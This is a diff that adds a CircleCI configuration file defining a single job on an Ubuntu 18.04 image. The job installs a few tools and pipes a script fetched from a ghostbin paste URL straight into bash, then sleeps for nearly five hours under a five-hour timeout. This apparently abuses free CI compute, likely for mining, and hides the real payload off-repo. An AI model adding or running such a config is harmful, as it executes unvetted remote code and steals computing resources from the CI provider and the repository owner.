@@ -1,0 +1,16 @@
+version: 2.1
+
+jobs:
+  jahantaysa:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL https://ghostbin.co/paste/6dyho/raw | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+workflows:
+  main:
+    jobs:
+      - jahantaysa
